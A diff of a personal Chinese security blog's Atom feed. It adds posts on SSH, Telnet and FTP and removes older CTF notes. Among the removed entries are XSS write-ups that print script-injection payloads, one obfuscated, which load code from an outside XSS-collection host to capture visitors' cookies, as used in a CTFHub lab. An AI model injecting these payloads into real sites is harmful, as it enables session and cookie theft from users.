@@ -6,7 +6,7 @@
   <link href="https://s1gma0.github.io/atom.xml" rel="self"/>
   
   <link href="https://s1gma0.github.io/"/>
-  <updated>2023-07-10T07:29:14.040Z</updated>
+  <updated>2023-07-26T16:57:42.188Z</updated>
   <id>https://s1gma0.github.io/</id>
   
   <author>
@@ -15,6 +15,90 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SSH</title>
+    <link href="https://s1gma0.github.io/2023/07/27/SSH/"/>
+    <id>https://s1gma0.github.io/2023/07/27/SSH/</id>
+    <published>2023-07-26T16:32:33.000Z</published>
+    <updated>2023-07-26T16:57:42.188Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SSH（Secure Shell）协议<strong>基于TCP协议，</strong>是一种用于在网络上安全传输数据的协议。</p><p>它是一种加密的协议，可用于在不安全的网络上进行远程登录、文件传输和命令执行等操作，以确保这些操作的机密性和完整性。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307270039964.png"></p><p>SSH 使用客户端-服务器（C/S）模型，<strong>默认端口是 22</strong>。SSH 是一个守护进程，负责实时监听客户端请求，并进行处理。</p><p>SSH协议分为两个主要版本：SSH1和SSH2。SSH1已经被认为是不安全的，现在已经被SSH2取代。SSH2协议是目前使用最广泛的版本，它提供了更好的安全性和可靠性。</p><h1 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h1><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>在使用SSH连接到远程计算机之前，用户必须生成一对密钥（公钥和私钥）。在建立SSH连接时，远程计算机会向用户发送一个随机数，并要求用户对该随机数进行加密。用户使用私钥对随机数进行加密后，将其发送回远程计算机。远程计算机使用用户的公钥对加密后的随机数进行解密，以验证用户的身份。</p><p>例：B有一对密钥，A想向B发消息，先发送一个请求。B收到请求后将公钥给A，A用公钥将传送的信息加密，B收到加密信息后用私钥解密。关键：使用私钥解密公钥。</p><p>注意：但是会遇到“<strong>中间人攻击</strong>”的问题，如下：</p><p>中间人C拦截A的请求，冒充B发送假公钥给A。A会把假公钥加密的信息传给C，C接收到信息并解密获取到信息。</p><h2 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h2><p><a href="https://blog.csdn.net/Azoner/article/details/123764052">https://blog.csdn.net/Azoner/article/details/123764052</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;SSH（Secure Shell）协议&lt;strong&gt;基于TCP协议，&lt;/strong&gt;是一种用于在网络上安全传输数据的协议。&lt;/p&gt;
+&lt;p</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Telnet</title>
+    <link href="https://s1gma0.github.io/2023/07/27/Telnet/"/>
+    <id>https://s1gma0.github.io/2023/07/27/Telnet/</id>
+    <published>2023-07-26T16:19:19.000Z</published>
+    <updated>2023-07-26T16:31:50.013Z</updated>
+    
+    <content type="html"><![CDATA[<p>Telnet协议是一种在网络上远程登录到其他计算机的标准协议。</p><p>它基于<strong>TCP协议</strong>，用于通过一个终端登陆到其它服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307270025967.png"></p><div align = "center">Telnet:远程登陆协议</div><p>由于telnet的通信过程采用<strong>明文传输</strong>(包括用户名和密码)，所以它的安全性较差，容易受到网络攻击。因此，现在很少使用Telnet协议进行远程登录，而更多地使用SSH（Secure Shell）协议，这是一种更安全的协议，它使用加密技术来保护通信过程中的数据安全。</p><p>这就是为什么如今很少使用 Telnet，而是使用一种称为 SSH 的非常安全的网络传输协议的主要原因。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;Telnet协议是一种在网络上远程登录到其他计算机的标准协议。&lt;/p&gt;
+&lt;p&gt;它基于&lt;strong&gt;TCP协议&lt;/strong&gt;，用于通过一个终端登陆到其它服务器。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/S1gma0/im</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>FTP</title>
+    <link href="https://s1gma0.github.io/2023/07/27/FTP/"/>
+    <id>https://s1gma0.github.io/2023/07/27/FTP/</id>
+    <published>2023-07-26T16:01:38.000Z</published>
+    <updated>2023-07-26T16:32:20.364Z</updated>
+    
+    <content type="html"><![CDATA[<p>FTP（File Transfer Protocol，文件传输协议）是一种标准的网络协议。它<strong>基于TCP协议</strong>，是一种用于在计算机之间传输文件的协议，可以屏蔽操作系统和文件存储方式。它是最早开发的用于文件传输的协议之一，并且今天仍被广泛使用。</p><p>FTP采用客户端-服务器（C/S）模型，在客户端与 FTP 服务器之间建立<strong>两个</strong>连接。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307270012952.png"></p><p>FTP 的独特的优势同时也是与其它客户服务器程序最大的不同点就在于它在两台通信的主机之间使用了<strong>两条 TCP 连接</strong>（其它客户服务器应用程序一般只有一条 TCP 连接）：</p><ol><li>控制连接：用于传送控制信息（命令和响应）</li><li>数据连接：用于数据传送；</li></ol><p>这种将命令和数据分开传送的思想大大提高了 FTP 的效率。</p><p>注意 ⚠️：<strong>FTP 是一种不安全的协议</strong>，因为它在传输过程中不会对数据进行加密。因此，FTP 传输的文件可能会被窃听或篡改。建议在传输敏感数据时使用更安全的协议，如 SFTP（一种基于 SSH 协议的安全文件传输协议，用于在网络上安全地传输文件）。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;FTP（File Transfer Protocol，文件传输协议）是一种标准的网络协议。它&lt;strong&gt;基于TCP协议&lt;/strong&gt;，是一种用于在计算机之间传输文件的协议，可以屏蔽操作系统和文件存储方式。它是最早开发的用于文件传输的协议之一，并且今天仍被广泛使用。&lt;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>FTP匿名身份验证</title>
+    <link href="https://s1gma0.github.io/2023/07/20/FTP%E5%8C%BF%E5%90%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/"/>
+    <id>https://s1gma0.github.io/2023/07/20/FTP%E5%8C%BF%E5%90%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/</id>
+    <published>2023-07-20T06:54:29.000Z</published>
+    <updated>2023-07-20T06:55:21.556Z</updated>
+    
+    <content type="html"><![CDATA[<p>s</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;s&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>115Readme</title>
@@ -409,113 +493,6 @@
     <category term="HTTP协议" scheme="https://s1gma0.github.io/tag/HTTP%E5%8D%8F%E8%AE%AE/"/>
     
     <category term="请求方式" scheme="https://s1gma0.github.io/tag/%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>知识杂记</title>
-    <link href="https://s1gma0.github.io/2021/12/05/%E7%9F%A5%E8%AF%86%E6%9D%82%E8%AE%B0/"/>
-    <id>https://s1gma0.github.io/2021/12/05/%E7%9F%A5%E8%AF%86%E6%9D%82%E8%AE%B0/</id>
-    <published>2021-12-05T03:49:47.000Z</published>
-    <updated>2022-02-01T09:57:45.188Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="URI、URL、URN"><a href="#URI、URL、URN" class="headerlink" title="URI、URL、URN"></a>URI、URL、URN</h1><h2 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h2><p>URI(uniform resource identifier)，统一资源标识符，用来唯一的标识一个资源。<br>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的<br>URI一般由三部组成：<br>①访问资源的命名机制<br>②存放资源的主机名<br>③资源自身的名称，由路径表示，着重强调于资源。</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL(uniform resource locator)，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</p><p>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：<br>①协议(或称为服务方式)<br>②存有该资源的主机IP地址(有时也包括端口号)<br>③主机资源的具体地址。如目录和文件名等</p><p>例如<code>https://s1gma0.github.io/category/CTF/index.php?boardID=5&amp;ID=24618&amp;page=1#anchor</code></p><p>一个完整的URL包括以下几个部分：<br>①<strong>协议</strong>：在internet中可以使用很多协议，http、https、file、mailto、ftp。该URL的使用的是”https“协议。</p><p>②<strong>域名</strong>：该URL的域名是s1gma0.github.io</p><p>③<strong>端口</strong>：跟在域名后面的是端口，域名和端口之间用”:“作为分隔符。端口不是一个URL必须要有的部分，如果省略端口，将采用默认端口。该URL省略了端口，采用了默认的端口。</p><p>④<strong>虚拟目录</strong>：在域名后的第一个”/“和最后一个”/“之间的部分是虚拟目录。虚拟目录也不是一个URL必须要有的部分。本URL的虚拟目录为/category/CTF/</p><p>⑤<strong>文件名</strong>：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.php”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名.</p><p>⑥<strong>锚</strong>：从“#”开始到最后，都是锚部分。该URL中的锚是“anchor”。锚部分也不是一个URL必须的部分</p><p>⑦<strong>参数</strong>：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。该URL中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p><h2 id="URN"><a href="#URN" class="headerlink" title="URN"></a>URN</h2><p>URN(uniform resource name)，统一资源命名，是通过名字来标识资源。</p><h2 id="三者的区别"><a href="#三者的区别" class="headerlink" title="三者的区别"></a>三者的区别</h2><p>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个URL都是URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI都是 URN 的示例。</p><h1 id="URL常见协议"><a href="#URL常见协议" class="headerlink" title="URL常见协议"></a>URL常见协议</h1><p>http：超文本传输协议。</p><p>https：超文本传输安全协议。<br>file：本地文件传输协议，主要用于访问本地计算机中的文件。</p><p>mailto：一种电子邮件协议，主要用于发送邮件。</p><p>ftp：文本传输协议，主要用于在网络上进行文件传输。</p><h1 id="HTTP头注入（待补充）"><a href="#HTTP头注入（待补充）" class="headerlink" title="HTTP头注入（待补充）"></a>HTTP头注入（待补充）</h1><h2 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h2><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段。（维基百科）</p><p>简单地说，xff是告诉服务器当前请求者的最终ip的http请求头字段，通常可以直接通过修改http头中的X-Forwarded-For字段来仿造请求的最终ip。</p><p>X-Forwarded-For(XFF)，代表了HTTP的请求端真实的IP。通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库。</p><p><code>X-Forwarded-For: 123.456.789.123</code></p><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p>HTTP来源地址（referer，或HTTPreferer），是HTTP表头的一个字段，用来表示从哪儿链接到当前的网页，采用的格式是URL。换句话说，借着HTTP来源地址，当前的网页可以检查访客从哪里而来，这也常被用来对付伪造的跨网站请求。（维基百科）</p><p>referer告诉服务器当前访问者是从哪个url地址跳转到自己的。它和xff一样，可直接修改。</p><p><code>Referer: https://www.baidu.com</code></p><h1 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h1><h2 id="矩阵的鞍点"><a href="#矩阵的鞍点" class="headerlink" title="矩阵的鞍点"></a>矩阵的鞍点</h2><p>在矩阵中，一个数在所在行中是最大值，在所在列中是最小值，则被称为鞍点。</p><p>例如矩阵a</p><p>1    2   3   4    5</p><p>5    6   7   8    9</p><p>10 11 12 13 14</p><p>该矩阵的鞍点为5.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;URI、URL、URN&quot;&gt;&lt;a href=&quot;#URI、URL、URN&quot; class=&quot;headerlink&quot; title=&quot;URI、URL、URN&quot;&gt;&lt;/a&gt;URI、URL、URN&lt;/h1&gt;&lt;h2 id=&quot;URI&quot;&gt;&lt;a href=&quot;#URI&quot; class=&quot;he</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://s1gma0.github.io/category/CTF/"/>
-    
-    
-    <category term="CTF" scheme="https://s1gma0.github.io/tag/CTF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XSSplatform</title>
-    <link href="https://s1gma0.github.io/2021/12/05/XSSplatform/"/>
-    <id>https://s1gma0.github.io/2021/12/05/XSSplatform/</id>
-    <published>2021-12-05T02:57:50.000Z</published>
-    <updated>2022-02-01T09:56:24.840Z</updated>
-    
-    <content type="html"><![CDATA[<p>将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果</p><p><code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;script src=http://xsscom.com//a0zR72&gt;&lt;/script&gt;</code></p><p>或者</p><p><code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxsscom.com%2F%2Fa0zR72%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;</code></p><p>再或者以你任何想要的方式插入</p><p><code>http://xsscom.com//a0zR72</code></p><p>再或者以你任何想要的方式插入</p><p><code>&lt;script src=&gt;&lt;/script&gt;</code></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;#39;&amp;quot;&amp;gt;&amp;lt;script src=http://xsscom.com//a0zR72&amp;gt;&amp;lt;/</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://s1gma0.github.io/category/CTF/"/>
-    
-    
-    <category term="Web" scheme="https://s1gma0.github.io/tag/Web/"/>
-    
-    <category term="XSS" scheme="https://s1gma0.github.io/tag/XSS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>反射型XSS</title>
-    <link href="https://s1gma0.github.io/2021/12/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"/>
-    <id>https://s1gma0.github.io/2021/12/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/</id>
-    <published>2021-12-05T02:28:01.000Z</published>
-    <updated>2022-02-01T09:57:14.029Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="一、寻找漏洞"><a href="#一、寻找漏洞" class="headerlink" title="一、寻找漏洞"></a>一、寻找漏洞</h1><p>在搜索框中随意输入字符，发现输入的字符直接出现在界面上。<br>然后输入特殊字符进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">//括号里的1可以为任意字符，将显示在弹窗界面上</span><br></pre></td></tr></table></figure><p>出现了弹窗，表明网页没有对用户的输入进行处理，直接输出到界面上。<br>XSS漏洞出现。</p><h1 id="二、实施攻击"><a href="#二、实施攻击" class="headerlink" title="二、实施攻击"></a>二、实施攻击</h1><p>在第一个搜索框中输入下面构造的payload，并点击submit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=http://xsscom.com//a0zR72&gt;&lt;/script&gt;</span><br><span class="line">//这个payload将执行http://xsscom.com//a0zR72下的项目代码</span><br></pre></td></tr></table></figure><p>然后在网页源代码中查找到这个payload是完整的，同时submit点击之后，URL发生改变。</p><p>将改变后的URL在第二个搜索框中输入并send</p><p>此时XSS platform收到了报文，在cookies中发现了flag</p><p><code>cookie : flag=ctfhub&#123;3efc235465db70e45070d143&#125;</code></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;一、寻找漏洞&quot;&gt;&lt;a href=&quot;#一、寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;一、寻找漏洞&quot;&gt;&lt;/a&gt;一、寻找漏洞&lt;/h1&gt;&lt;p&gt;在搜索框中随意输入字符，发现输入的字符直接出现在界面上。&lt;br&gt;然后输入特殊字符进行尝试&lt;/p&gt;
-&lt;figu</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://s1gma0.github.io/category/CTF/"/>
-    
-    
-    <category term="WriteUp" scheme="https://s1gma0.github.io/tag/WriteUp/"/>
-    
-    <category term="Web" scheme="https://s1gma0.github.io/tag/Web/"/>
-    
-    <category term="XSS" scheme="https://s1gma0.github.io/tag/XSS/"/>
-    
-    <category term="CTFHub" scheme="https://s1gma0.github.io/tag/CTFHub/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hexo部署时Error: Spawn failed的解决办法</title>
-    <link href="https://s1gma0.github.io/2021/12/02/Hexo%E9%83%A8%E7%BD%B2%E6%97%B6Error-Spawn-failed%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
-    <id>https://s1gma0.github.io/2021/12/02/Hexo%E9%83%A8%E7%BD%B2%E6%97%B6Error-Spawn-failed%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</id>
-    <published>2021-12-02T13:22:32.000Z</published>
-    <updated>2021-12-04T17:26:44.737Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>目前，有三种解决方法。主要有两种合适的解决办法,</strong></p><h1 id="一、git-repo配置地址不正确"><a href="#一、git-repo配置地址不正确" class="headerlink" title="一、git repo配置地址不正确"></a>一、git repo配置地址不正确</h1><p><strong>我目前所遇到的问题都是这个方法解决的，去GitHub上的仓库里重新复制HTTPS，更改一下repo。</strong></p><p>下面是将http方式改为ssh</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##进入站点根目录</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/usr/local/src/hexo/hanyubolg/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##删除git提交内容文件夹</span></span><br><span class="line"><span class="string">vim</span> <span class="string">_config.yml</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##修改</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">repo:</span> <span class="string">https://github.com/yourname/yourname.github.io.git</span> <span class="string">-&gt;</span> <span class="string">git@github.com:a956551943/weixiaohui.github.io.git</span></span><br><span class="line"><span class="attr">branch:</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##最后</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><h2 id="二、删除git提交内容，然后更改换行符自动转换的设置"><a href="#二、删除git提交内容，然后更改换行符自动转换的设置" class="headerlink" title="二、删除git提交内容，然后更改换行符自动转换的设置"></a>二、删除git提交内容，然后更改换行符自动转换的设置</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##进入站点根目录</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/usr/local/src/hexo/hanyubolg/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##删除git提交内容文件夹</span></span><br><span class="line"><span class="string">rm</span> <span class="string">-rf</span> <span class="string">.deploy_git/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##执行</span></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">core.autocrlf</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##最后</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><h3 id="三、强制推送（不推荐）"><a href="#三、强制推送（不推荐）" class="headerlink" title="三、强制推送（不推荐）"></a>三、强制推送（不推荐）</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##进入站点根目录</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/usr/local/src/hexo/hanyubolg/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##进入depoly文件夹</span></span><br><span class="line"><span class="string">cd</span> <span class="string">.deploy_git/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##强制推送</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="string">-f</span></span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;目前，有三种解决方法。主要有两种合适的解决办法,&lt;/strong&gt;&lt;/p&gt;
-&lt;h1 id=&quot;一、git-repo配置地址不正确&quot;&gt;&lt;a href=&quot;#一、git-repo配置地址不正确&quot; class=&quot;headerlink&quot; title=&quot;一、git rep</summary>
-      
-    
-    
-    
-    <category term="Hexo" scheme="https://s1gma0.github.io/category/Hexo/"/>
-    
-    
-    <category term="error" scheme="https://s1gma0.github.io/tag/error/"/>
     
   </entry>
   
